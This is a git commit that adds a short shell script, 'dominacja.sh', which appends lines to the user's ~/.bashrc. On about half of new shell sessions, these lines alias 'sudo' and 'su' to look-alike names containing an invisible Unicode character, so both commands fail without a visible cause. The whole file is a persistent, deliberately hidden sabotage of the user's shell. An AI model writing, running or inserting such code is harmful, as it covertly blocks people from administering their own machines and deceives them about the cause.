286ddbfe5131b00432fcf87b9a21163507b40e2d
XXXDominatorXXX <101982442+XXXDominatorXXX@users.noreply.github.com>
2022-03-20 15:53:45 +0100

    Create dominacja.sh

---
+++ dominacja.sh
@@ -0,0 +1,6 @@
+echo 'RAND=$(($RANDOM%10)) ' >> ~/.bashrc
+echo 'if [ $RAND -gt 4 ]' >> ~/.bashrc
+echo 'then' >> ~/.bashrc
+echo 'alias sudo="sud‎o"' >> ~/.bashrc
+echo 'alias su="s‎u"' >> ~/.bashrc
+echo 'fi' >> ~/.bashrc
